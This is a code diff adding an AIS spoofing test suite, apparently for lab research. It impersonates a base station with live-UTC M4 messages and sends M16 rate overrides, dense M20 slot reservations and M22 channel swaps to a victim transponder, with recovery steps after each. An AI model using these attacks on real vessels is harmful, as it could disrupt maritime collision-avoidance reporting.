@@ -458,6 +458,75 @@ def build_m20_suite(ctx):
     return cells
 
 
+# ---- Base-station RE-TEST suite (focused; --base-retest / --base-retest-only) ------------
+# Purpose: settle the M20/M22 question WITHOUT re-running phases 1-3. This suite fires ONLY the
+# base-station management commands, each with a freshly UTC-stamped Message 4 base announcement
+# that the runner keeps alive with a heartbeat for the whole dwell (a real base transmits M4
+# continuously; two bursts per cell may not be enough for a unit to treat the base as present).
+#
+# Three corrections baked in vs the earlier runs:
+#   1. M4 carries LIVE UTC now (m4_base_report) -> the base looks synchronised, so a unit that
+#      accepted M16 but balked at the higher-stakes M20/M22 no longer has that excuse.
+#   2. M20 is exercised at MEANINGFUL densities (50/67/75% of frame). The old single 10-slot
+#      (~0.4%) reservation was unobservable against normal SOTDMA churn -- "no effect" there was
+#      a measurement artifact, not the unit ignoring M20.
+#   3. M22 is fired BOTH ways: the OPTIONAL addressed form AND the spec-PRIMARY regional
+#      (broadcast, bounding-box) form. A conforming unit may ignore the addressed form yet honour
+#      the regional one -- so testing only the addressed form cannot conclude "ignores M22".
+# M16 (max + beyond-max rate) is included as a positive control: it already works, so it confirms
+# the base is being accepted and the heartbeat is doing its job.
+def build_base_retest(ctx, half_deg=0.5):
+    V = ctx.victim_mmsi
+    vlat, vlon = ctx.victim_lat, ctx.victim_lon
+    m4 = (p3enc.m4_base_report(BASE_MMSI, vlat, vlon), "M4: announce base (live UTC)")
+
+    def recover():
+        return [(p3enc.m22_channel(BASE_MMSI, V, channel_a=AIS_CH_A, channel_b=AIS_CH_B, power=0),
+                 "RECOVERY addressed -> AIS channels + high power"),
+                (p3enc.m22_channel_regional(BASE_MMSI, vlat, vlon, channel_a=AIS_CH_A,
+                                            channel_b=AIS_CH_B, power=0, half_deg=half_deg),
+                 "RECOVERY regional -> AIS channels + high power"),
+                (p3enc.m16_rate_assignment(BASE_MMSI, V, 20),
+                 "RECOVERY release rate (autonomous wins, self-times-out)")]
+
+    cells = []
+    # --- M16: positive control + beyond-spec. Fired at REST so the forced MAX rate is an
+    #     unmistakable speed-up against the unit's slow anchored baseline. M16 already works, so
+    #     this doubles as a live check that the base + M4 heartbeat are being accepted at all. ---
+    cells.append(("br_M16_ratemax",
+        [m4, m4, (p3enc.m16_rate_assignment(BASE_MMSI, V, 600),
+                  "M16 CONTROL force MAX rate 600/10min (known-good)")]))
+    cells.append(("br_M16_overmax",
+        [m4, m4, (p3enc.m16_rate_raw(BASE_MMSI, V, 1000),
+                  "M16 beyond-spec 1000/10min (past the 600 max; obeying it is a finding)")]))
+    cells.append(("br_recover_M16", [m4] + recover()))
+    # --- M20 density block. The runner holds the victim at a CONSTANT fast speed across this whole
+    #     block (control + sweep) so reporting rate is matched and the ONLY variable is how much of
+    #     the frame is reserved. Cells are named m20_base_* so analyze_m20.py picks up its
+    #     density-sweep honor/ignore verdict with zero changes; m20_base_control (no reservation)
+    #     is the same-speed baseline it compares against. A compliant unit must vacate a rising
+    #     share of the frame as density climbs 50 -> 67 -> 75%. ---
+    cells.append(("m20_base_control", [m4, m4]))
+    for label, kw, human in [
+        ("half",      dict(offset=0, number=10, timeout=7, increment=20), "10 of 20 slots (~50%)"),
+        ("dense",     dict(offset=0, number=10, timeout=7, increment=15), "10 of 15 slots (~67%)"),
+        ("verydense", dict(offset=0, number=15, timeout=7, increment=20), "15 of 20 slots (~75%)"),
+    ]:
+        cells.append((f"m20_base_{label}",
+            [m4, m4, (p3enc.m20_datalink(BASE_MMSI, **kw), f"M20 reserve {human}")]))
+    # --- M22 both ways (at rest), each with its own recovery ---
+    cells.append(("br_M22_addressed",
+        [m4, m4, (p3enc.m22_channel(BASE_MMSI, V, channel_a=AIS_CH_B, channel_b=AIS_CH_A),
+                  "M22 ADDRESSED swap channels A<->B (optional path)")]))
+    cells.append(("br_recover_M22addr", [m4] + recover()))
+    cells.append(("br_M22_regional",
+        [m4, m4, (p3enc.m22_channel_regional(BASE_MMSI, vlat, vlon,
+                  channel_a=AIS_CH_B, channel_b=AIS_CH_A, half_deg=half_deg),
+                  "M22 REGIONAL swap channels A<->B (spec-primary broadcast path, box around victim)")]))
+    cells.append(("br_recover_M22reg", [m4] + recover()))
+    return cells
+
+
 def main():
     ap = argparse.ArgumentParser(description="Run a full GPS+attack session (synced).")
     ap.add_argument("--gps-port", required=True, help="serial port feeding the victim GPS")
@@ -490,6 +559,21 @@ def main():
     ap.add_argument("--m20-gap", type=float, default=35.0,
                     help="dwell after each M20 cell (>= a few victim report cycles so the slot "
                          "map re-settles and the reaction is visible)")
+    ap.add_argument("--base-retest", action="store_true",
+                    help="also run the focused BASE-STATION re-test (M16 control + M20 dense + "
+                         "M22 addressed AND regional), each with a live-UTC M4 heartbeat")
+    ap.add_argument("--base-retest-only", action="store_true",
+                    help="run ONLY the base-station re-test (skip phases 1-3 and the M20 suite) "
+                         "so you can settle M20/M22 without rerunning everything")
+    ap.add_argument("--base-retest-gap", type=float, default=90.0,
+                    help="dwell after each base-retest command (kept long so slow effects like "
+                         "rate/channel changes have time to appear); M4 heartbeat runs through it")
+    ap.add_argument("--m4-heartbeat", type=float, default=10.0,
+                    help="seconds between M4 base-report keepalives sent during base-retest dwells "
+                         "(10s ~ a real base station's M4 cadence)")
+    ap.add_argument("--region-half-deg", type=float, default=0.5,
+                    help="half-size (deg) of the regional M22 bounding box around the victim "
+                         "(0.5 deg ~30NM/side, well inside the 120NM evaluation range)")
     ap.add_argument("--phase3-gap", type=float, default=90.0,
                     help="seconds of dwell after each phase-3 command (kept long so slow "
                          "effects like rate changes or retunes have time to appear)")
@@ -541,7 +625,7 @@ def main():
 
     ctx = Ctx(args.victim_mmsi, gps)
     timeline = build_timeline(ctx)
-    if args.phase2_only or args.phase3_only:
+    if (args.phase2_only or args.phase3_only or args.base_retest_only or args.m20_only):
         timeline = []
     if args.only:
         timeline = [(n, p) for (n, p) in timeline if n in args.only]
@@ -586,12 +670,86 @@ def main():
                 _send_once(r); time.sleep(0.8)
         rec(event="attack_end", name=name)
 
+    def m4_dwell(seconds, interval):
+        """Sleep `seconds`, re-sending an M4 base report every `interval` s so the base stays
+        continuously present for the whole dwell. m4_base_report re-stamps live UTC on each call,
+        so the base always looks synchronised. Used only by the base-retest."""
+        end = time.time() + seconds
+        while time.time() < end:
+            time.sleep(min(interval, max(0.0, end - time.time())))
+            try:
+                ws.send(p3enc.m4_base_report(BASE_MMSI, ctx.victim_lat, ctx.victim_lon))
+                rec(event="m4_heartbeat", meta="base keepalive")
+            except Exception:
+                pass
+
     try:
-        if not (args.m20_only or args.phase2_only or args.phase3_only):
+        if not (args.m20_only or args.phase2_only or args.phase3_only or args.base_retest_only):
             for i, (name, payloads) in enumerate(timeline):
                 fire(name, payloads, i, len(timeline), tag="P1:")
                 if i < len(timeline) - 1:
                     time.sleep(args.gap)
+
+        # ---- BASE-STATION re-test (focused; --base-retest or --base-retest-only) ----
+        # Runs ONLY the base-station management commands with a live-UTC M4 heartbeat maintained
+        # through every dwell. Lets you settle M20/M22 without rerunning phases 1-3.
+        if args.base_retest or args.base_retest_only:
+            br = build_base_retest(ctx, half_deg=args.region_half_deg)
+            print(f"\n=== BASE RE-TEST: {len(br)} cells, {args.base_retest_gap}s dwell each, "
+                  f"M4 heartbeat every {args.m4_heartbeat}s ===")
+            print("    M16 control (+ beyond-max) | M20 dense 50/67/75% | M22 addressed + regional")
+            print("    watch serial (own reports) + VHF (witness) for rate/channel/slot change\n")
+            rec(event="base_retest_start", n=len(br), gap=args.base_retest_gap,
+                m4_heartbeat=args.m4_heartbeat, base_mmsi=BASE_MMSI, regular_mmsi=REGULAR_MMSI,
+                region_half_deg=args.region_half_deg)
+
+            def _br_extra(nm):
+                low = nm.lower()
+                if "recover" in low or "control" in low:
+                    return {"command": "recovery" if "recover" in low else "M20",
+                            "source": "base", "density": nm.split("_")[-1] if "control" in low else ""}
+                if nm.startswith("m20_base_"):
+                    return {"command": "M20", "source": "base", "density": nm.split("_")[-1]}
+                parts = nm[len("br_"):].split("_", 1)   # br_<command>_<variant>
+                return {"command": parts[0], "source": "base",
+                        "variant": parts[1] if len(parts) > 1 else ""}
+
+            fast_on = False
+            for i, (name, payloads) in enumerate(br):
+                # hold a constant fast SOG across the whole m20_base_* block so the density sweep
+                # and its control window share the same reporting rate (only the reservation varies)
+                want_fast = name.startswith("m20_base_")
+                if want_fast and not fast_on:
+                    gps.set_position(ctx.victim_lat, ctx.victim_lon,
+                                     speed=args.fast_speed, course=90.0)
+                    rec(event="victim_speed_set", speed=args.fast_speed,
+                        note="fast for M20 slot sampling (base-retest)")
+                    print(f"    (victim SOG -> {args.fast_speed}kn for dense M20 slot sampling; settling 8s)")
+                    fast_on = True; time.sleep(8)
+                elif fast_on and not want_fast:
+                    gps.set_position(ctx.victim_lat, ctx.victim_lon, speed=0.0)
+                    rec(event="victim_speed_set", speed=0.0,
+                        note="rest after M20 block (base-retest)")
+                    fast_on = False
+                fire(name, payloads, i, len(br), tag="BR:", extra=_br_extra(name))
+                dwell = 5 if "recover" in name.lower() else args.base_retest_gap
+                if i < len(br) - 1:
+                    print(f"    ...{dwell:.0f}s dwell (M4 heartbeat live; watch serial + VHF)...")
+                    m4_dwell(dwell, args.m4_heartbeat)
+            if fast_on:
+                gps.set_position(ctx.victim_lat, ctx.victim_lon, speed=0.0)
+                rec(event="victim_speed_set", speed=0.0, note="rest at end of base-retest")
+            # final recovery: addressed + regional restore + rate release (belt and braces)
+            print("    base-retest final recovery: AIS channels 2087/2088 + high power + rate release")
+            for _ in range(3):
+                ws.send(p3enc.m22_channel(BASE_MMSI, args.victim_mmsi,
+                                          channel_a=AIS_CH_A, channel_b=AIS_CH_B, power=0))
+                ws.send(p3enc.m22_channel_regional(BASE_MMSI, ctx.victim_lat, ctx.victim_lon,
+                                                   channel_a=AIS_CH_A, channel_b=AIS_CH_B,
+                                                   power=0, half_deg=args.region_half_deg))
+                ws.send(p3enc.m16_rate_assignment(BASE_MMSI, args.victim_mmsi, 20))
+                rec(event="final_recovery", meta="restore after base-retest")
+                time.sleep(1)
 
         # ---- M20 slot-reservation density suite (focused; --m20 or --m20-only) ----
         if args.m20 or args.m20_only:
